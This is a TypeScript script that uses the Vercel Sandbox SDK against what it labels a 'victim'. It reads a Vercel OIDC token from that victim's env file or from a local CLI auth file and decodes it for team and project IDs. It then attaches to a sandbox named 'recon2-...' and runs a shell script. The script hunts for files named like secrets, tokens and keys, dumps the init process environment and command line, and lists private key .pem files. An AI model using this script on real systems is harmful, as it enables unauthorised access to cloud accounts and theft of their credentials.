import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const s = await Sandbox.get({ name: "recon2-1787252249958", token: VICTIM, teamId, projectId });
  const SCRIPT = `
set +e
echo "=== secret-ish files in /run /var /etc /opt ==="
find /run /var /etc /opt -type f 2>/dev/null | grep -iE 'key|secret|token|cred|auth' | grep -viE 'node_modules|/usr/lib|/usr/share|ssl/certs|pki' | head -30
echo "=== proc 1 environ ==="
tr '\\0' '\\n' < /proc/1/environ 2>/dev/null
echo "=== sandbox-init cmdline ==="
tr '\\0' '\\n' < /proc/1/cmdline 2>/dev/null
echo "=== any ed25519/private key files anywhere writable by us ==="
find / -xdev -type f -name '*.pem' 2>/dev/null | head -10
echo "=== DONE ==="
`;
  const r = await s.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });